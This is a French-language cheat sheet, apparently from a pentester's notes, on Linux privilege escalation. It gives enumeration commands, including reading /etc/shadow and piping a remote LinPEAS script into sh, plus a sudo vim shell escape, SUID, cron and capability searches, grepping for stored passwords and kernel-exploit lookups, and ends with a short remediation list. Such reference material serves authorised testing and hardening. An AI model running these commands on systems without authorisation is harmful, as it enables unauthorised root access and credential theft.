---
tags: [vulnerability, linux, privesc, post-exploitation]
vuln_name: "Linux Privilege Escalation"
owasp_category: "A05:2021 - Security Misconfiguration"
last_updated: 2024-01-01
---

# 🐛 Linux Privilege Escalation

## 📖 Description

> Techniques permettant de passer d'un accès utilisateur standard à root sur un système Linux.

---

## 🔍 Énumération (toujours commencer par là)

```bash
# Infos système
uname -a
cat /etc/os-release
id && whoami

# Utilisateurs
cat /etc/passwd
cat /etc/shadow  (si lisible)

# Automatisé — LinPEAS (le plus complet)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Automatisé — LinEnum
./LinEnum.sh
```

---

## 💥 Vecteurs courants

### 1. Sudo misconfiguration

```bash
sudo -l   # Lister les droits sudo

# Si on peut lancer vim en sudo
sudo vim -c ':!/bin/bash'

# GTFOBins — liste des binaires exploitables
# https://gtfobins.github.io/
```

### 2. SUID / SGID binaries

```bash
# Trouver les binaires SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### 3. Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron*
# Chercher des scripts writables exécutés par root
```

### 4. Capabilities

```bash
getcap -r / 2>/dev/null
# python3 avec cap_setuid → root possible
```

### 5. Mot de passe dans fichiers

```bash
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
grep -r "password" /var/www/ 2>/dev/null
history
```

### 6. Kernel exploits

```bash
uname -r   # Version du kernel
# Chercher CVE correspondants sur exploit-db
searchsploit linux kernel 5.4
```

---

## 🛡️ Remédiation

- Audit régulier des droits sudo (`/etc/sudoers`)
- Supprimer le bit SUID des binaires non nécessaires
- Sécuriser les scripts de cron (owner root, droits 700)
- Mise à jour régulière du kernel

---

## 🔗 Ressources

- [GTFOBins](https://gtfobins.github.io/) ← indispensable
- [PayloadsAllTheThings — PrivEsc Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks — Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
